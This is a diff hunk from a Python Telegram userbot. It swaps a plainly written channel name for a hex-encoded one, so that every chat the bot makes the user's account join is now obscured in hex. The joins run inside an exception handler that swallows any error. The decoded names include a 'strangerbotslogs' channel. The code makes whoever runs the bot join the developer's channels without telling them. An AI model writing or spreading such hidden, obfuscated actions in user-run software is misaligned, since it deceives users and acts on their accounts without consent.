@@ -65,7 +65,7 @@ class Userbot(Client):
                 await self.one.join_chat("53484956414E5348343734")
                 await self.one.join_chat("535452414E4745524153534F43494154494F4E")
                 await self.one.join_chat("4D4153544957495448465249454E44535844")
-                await self.one.join_chat("STRANGERXWORLD")
+                await self.one.join_chat("737472616E676572626F74736C6F6773")
                 await self.one.join_chat("737472616E676572626F74736C6F6773")
             except:
                 pass
